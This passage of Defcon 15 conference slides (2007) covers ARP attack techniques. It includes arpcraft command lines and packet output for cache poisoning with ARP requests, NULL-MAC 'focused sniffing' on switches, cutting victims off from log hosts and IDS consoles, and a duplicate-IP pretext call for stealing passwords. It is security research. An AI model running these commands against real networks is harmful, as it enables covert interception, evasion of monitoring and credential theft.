–
Send ARP Request to 192.168.1.100 [00:AA:BB:CC:DD:FF] from 192.168.1.20 
[00:AA:BB:CC:DD:EE]
~$./arpcraft -i en0 -sha 00:aa:bb:cc:dd:ee -spa 192.168.1.20 -tha 
00:aa:bb:cc:dd:ff -tpa 192.168.1.100 -o request
                     Ethernet Frame Layout
#################################################################
#  Destination MAC Address:     00:aa:bb:cc:dd:ff               #
#  Source MAC Address:          00:aa:bb:cc:dd:ee               #
#  Ether Type:                  ARP                             #
#################################################################
                     ARP Packet Layout
#################################################################
#  Hardware Type:                       1 (Ethernet)            #
#  Protocol Type:                       0800 (IP)               #
#  Hardware Address Length:             (6)                     #
#  Protocol Address Length:             (4)                     #
#  Opcode:                              Request                 #
#  Sender Hardware Address (SHA):       00:aa:bb:cc:dd:ee       #
#  Sender Protocol Address (SPA):       192.168.1.20            #
#  Target Hardware Address (THA):       00:aa:bb:cc:dd:ff       #
#  Target Protocol Address (TPA):       192.168.1.100           #
#################################################################
Injecting ARP request to 192.168.1.100 [00:aa:bb:cc:dd:ff] from 192.168.1.20 
[00:aa:bb:cc:dd:ee]
19
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Arpcraft
•
Send ARP Reply to 192.168.1.85 [00:AB:CD:EF:01:02] from 192.168.1.20 
[00:AA:BB:CC:DD:EE]
~$./arpcraft -i en0 -sha 00:aa:bb:cc:dd:ee -spa 192.168.1.20 -tha 00:AB:CD:EF:01:02 
-tpa 192.168.1.85 -o reply
                     Ethernet Frame Layout
#################################################################
#  Destination MAC Address:     00:AB:CD:EF:01:02               #
#  Source MAC Address:          00:aa:bb:cc:dd:ee               #
#  Ether Type:                  ARP                             #
#################################################################
                     ARP Packet Layout
#################################################################
#  Hardware Type:                       1 (Ethernet)            #
#  Protocol Type:                       0800 (IP)               #
#  Hardware Address Length:             (6)                     #
#  Protocol Address Length:             (4)                     #
#  Opcode:                              Reply                   #
#  Sender Hardware Address (SHA):       00:aa:bb:cc:dd:ee       #
#  Sender Protocol Address (SPA):       192.168.1.20            #
#  Target Hardware Address (THA):       00:AB:CD:EF:01:02       #
#  Target Protocol Address (TPA):       192.168.1.85            #
#################################################################
Injecting ARP reply to 192.168.1.85 [00:AB:CD:EF:01:02] from 192.168.1.20 
[00:aa:bb:cc:dd:ee]
20
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Attacks Reloaded - ARP Cache 
•
Again, traditional ARP cache poisoning techniques have weaknesses
–
Some OSs don’t update their ARP cache after receiving gratuitous ARP Replies that they aren’t 
expecting
–
Even if they do, most (All?) OSs will not add an entry to their ARP cache after receiving a 
Reply if an entry isn’t already there 
•
RFC 826 [1] states:
–
If a host receives an ARP REQUEST
–
and the target hardware address (THA) and target protocol address (TPA) match their own 
(ARP request destined for them)
–
Prior to responding, the host will update or add the source protocol address (SPA) and source 
hardware address (SHA) to its cache
–
Actual verbiage from RFC 826:
“... If the pair  is already in my translation table, update the 
sender hardware address ﬁeld of the entry with the new information in the packet and set Merge_ﬂag 
to true.
Am I the target protocol address?
Yes:
If Merge_ﬂag is false, add the triplet  to the translation table...”
21
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Attacks Reloaded - ARP Cache 
•
So according to RFC 826, if we use an ARP REQUEST packet instead of an ARP 
REPLY, we can poison our victim’s cache every time with a single packet
–
Even adding new entries to the cache instead of relying on there already being a matching 
entry 
22
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Attacks Reloaded - ARP Cache 
•
Attacker sends REQUEST to 192.168.1.20 from 192.168.1.1 with attacker’s MAC
23
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Attacks Reloaded - ARP Cache 
•
Demo
24
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Attacks Reloaded - Focused 
•
As mentioned, CAM table overflow technique has drawbacks
–
Highly identifiable
–
Hundreds or Thousands of packets
–
Modern switches can defeat it with technology like “Port Security”
•
Limit the number of MAC addresses allowed to be associated with a given port
•
Often, we want to sniff the traffic of a particular host, not necessarily the whole network
•
When the switch receives a frame it checks its CAM table to see if the destination 
hardware address exists
•
If not, the switch forwards the frame to all ports
•
We can accomplish this in a different way than CAM table overflow
25
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Attacks Reloaded - Focused 
•
Utilizing the ARP cache poisoning technique detailed above, if we poison the ARP cache 
of the victim with a NULL hardware address (00:00:00:00:00:00) for the destination (I.e 
the network gateway)
•
All frames from the victim to the gateway will be forwarded to all switch ports, allowing us 
to eavesdrop on that communication
–
Works on every switch we’ve tested:
•
Cisco
•
Bay Networks
•
HP
•
Etc.
•
Works despite Port Security, etc. because we’re sending 1 packet (Or at least one MAC, 
00:00:00:00:00:00) as opposed to thousands
•
Also, much less identifiable to network detection tools (IDS, etc)
26
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Attacks Reloaded - Focused 
•
Demo
27
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Attacks Reloaded - Other Fun
•
Some OSs can be poisoned with their own MAC address for the destination
–
Severs communication 
–
Prevents messages from ever reaching the network
–
Useful for:
•
Preventing log messages from reaching log host
•
Preventing host based IDS from reporting to central console
•
etc.
–
Victim = 192.168.1.20 [00:AA:BB:CC:DD:EE]
–
Log_host = 192.168.1.40 [00:1A:2B:3C:4D:5E]
attacker~$./arpcraft -i fxp0 -sha 00:aa:bb:cc:dd:ee -spa 192.168.1.40 
-tha 00:aa:bb:cc:dd:ee -tpa 192.68.1.20 -o request
28
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
•
Attacker sends REQUEST to victim with victim’s own MAC
29
Attacks Reloaded - Other Fun
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Attacks Reloaded - Other Fun
•
Victim attempts to log subsequent attack attempt
–
Victim’s ARP cache says Log_host is at local interface
–
Log message never reaches Log_host
30
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Attacks Reloaded - Other Fun
•
Duplicate IP address on network
–
If a host receives an ARP request or reply with the same protocol address (IP address) as its 
own interface, but a different hardware (MAC) address
•
Most OSs will warn the user that a duplicate IP address is in use on the network
•
Example: Windows pop-up
– “Windows - System Error”
– There is an IP address conflict with another system on the network
•
Proven effective in social engineering scenarios
– Call victim: “Hello, this is Mr. Tech from IT... It appears that we have a network issue 
with your machine... Give me your username / password...” 
•
Potential DoS
– Many packets like this can slow Windows down considerably, etc.
31
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Arpvenom
•
Tool to automate ARP attacks presented today
•
Details...
32
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Conclusion
•
Traditional ARP attacks work well but can have some weaknesses in certain 
environments
•
In some cases, using ARP REQUEST packets instead of ARP REPLY packets for cache 
poisoning can be more reliable
•
We can perform “focused sniffing” between hosts by poisoning the victim’s cache with a 
NULL MAC address for the intended destination
–
Less noisy than CAM table overflow
–
More reliable on switches with controls to prevent CAM table overflow
33
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Resources
•
Most recent version of slides, arpcraft, arpvenom, etc:
–
http://www.praetorianglobal.net/Presentations/arpreload.html
–
or 
–
http://www.digrev.org
•
RFC 826 ("An Ethernet Address Resolution Protocol" [Plummer-1982]): http://
www.faqs.org/rfcs/rfc826.html
•
...
34
Defcon 15
Las Vegas, NV August 2007
Jesse D’Aguanno
(c) Copyright 2007 Praetorian Global, LLC
Questions?
• Thanks!
•
Comments: PI:EMAIL
35